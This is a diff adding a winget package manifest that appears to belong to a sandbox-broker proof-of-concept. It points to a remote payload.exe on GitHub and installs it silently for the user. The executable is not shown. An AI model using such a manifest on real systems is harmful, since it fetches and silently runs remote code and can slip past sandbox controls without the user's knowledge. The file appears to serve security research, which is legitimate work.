@@ -1,0 +1,21 @@
+# yaml-language-server: $schema=https://aka.ms/winget-manifest.singleton.1.6.0.schema.json
+PackageIdentifier: AGY.Research.WingetBrokerProof
+PackageVersion: 1.0.0
+PackageLocale: en-US
+Publisher: AGY Research
+PackageName: Winget Broker Proof
+License: Test only
+ShortDescription: Benign Windows sandbox broker proof
+InstallerType: exe
+Scope: user
+InstallModes:
+  - silent
+Installers:
+  - Architecture: x64
+    InstallerUrl: https://raw.githubusercontent.com/arnodorian1337/antigravity-winget-broker-poc/daaae026aae091704a2371a172aa4f90f279b942/payload.exe
+    InstallerSha256: 1AA7E8FEACFA33935B8172086A01922502693628DDB504119C8E14A75B196C7C
+    InstallerSwitches:
+      Silent: /S
+      SilentWithProgress: /S
+ManifestType: singleton
+ManifestVersion: 1.6.0
